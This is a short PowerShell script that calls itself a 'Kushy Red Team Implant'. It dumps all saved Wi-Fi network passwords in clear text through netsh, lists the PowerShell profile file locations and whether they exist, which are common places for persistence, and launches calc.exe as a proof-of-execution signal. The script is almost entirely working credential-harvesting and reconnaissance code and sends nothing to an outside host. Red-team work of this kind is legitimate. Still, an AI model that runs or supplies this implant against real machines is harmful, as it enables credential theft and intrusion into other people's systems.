Write-Host "Hello World from Kushy Red Team Implant"

function Get-WifiCredentials {
    netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {
        $_ -match ':(.+)$'
        $profile = $matches[1].Trim()
        netsh wlan show profile name="$profile" key=clear | Select-String 'Key Content' |
            ForEach-Object {
                $_ -match ':(.+)$'
                [PSCustomObject]@{
                    Profile  = $profile
                    Password = if ($matches[1].Trim()) { $matches[1].Trim() } else { 'N/A' }
                }
            }
    }
}
$credentials = Get-WifiCredentials

function Get-PsProfileDetails {
    try {
        $profilePaths = @{
            AllUsersAllHosts       = $PROFILE.AllUsersAllHosts
            AllUsersCurrentHost    = $PROFILE.AllUsersCurrentHost
            CurrentUserAllHosts    = $PROFILE.CurrentUserAllHosts
            CurrentUserCurrentHost = $PROFILE.CurrentUserCurrentHost
        }
        $level = 1
        $profiles = foreach ($key in $profilePaths.Keys) {
            $location = $profilePaths[$key]
            $existent = if (Test-Path $location) { "True" } else { "False" }
            New-Object PSObject -Property @{
                Level       = $level
                Profile     = $key
                Location    = $location
                Existent    = $existent
                ParentFolder = Split-Path $location -Parent
            }
            $level++
        }
        $profiles | Select-Object Profile, Level, Location, Existent, ParentFolder
    } catch {
        "⚠️ Error in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
    }
}

$profiles = Get-PsProfileDetails

Start-Process calc.exe
